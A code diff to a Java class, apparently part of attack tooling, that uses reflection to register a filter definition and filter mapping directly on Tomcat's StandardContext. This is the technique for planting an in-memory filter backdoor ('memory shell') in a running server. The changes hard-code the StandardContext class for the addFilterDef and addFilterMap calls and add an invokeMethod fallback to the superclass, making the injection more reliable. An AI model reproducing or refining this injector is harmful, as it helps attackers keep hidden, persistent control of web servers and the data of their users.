@@ -96,7 +96,7 @@ public class TomcatFilterThreadLoader {
         setFieldValue(filterDef, "filterName", NAME);
         setFieldValue(filterDef, "filterClass", CLASSNAME);
         setFieldValue(filterDef, "filter", object);
-        invokeMethod(standardContext.getClass(), standardContext, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
+        invokeMethod(Class.forName("org.apache.catalina.core.StandardContext"), standardContext, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
 
         // 添加 filterMap
         Object filterMap = null;
@@ -120,7 +120,7 @@ public class TomcatFilterThreadLoader {
         //    public static final int REQUEST = 8;
         //    public static final int ASYNC = 16;
         setFieldValue(filterMap, "dispatcherMapping", 8);
-        invokeMethod(standardContext.getClass(), standardContext, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+        invokeMethod(Class.forName("org.apache.catalina.core.StandardContext"), standardContext, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
 
         Map filterConfigs = (Map) getFieldValue(standardContext, "filterConfigs");
         Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
@@ -231,6 +231,14 @@ public class TomcatFilterThreadLoader {
         method.setAccessible(true);
         Object object = method.invoke(obj, args);
         return object;
+    }
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        } catch (Exception e) {
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
     }
 
 
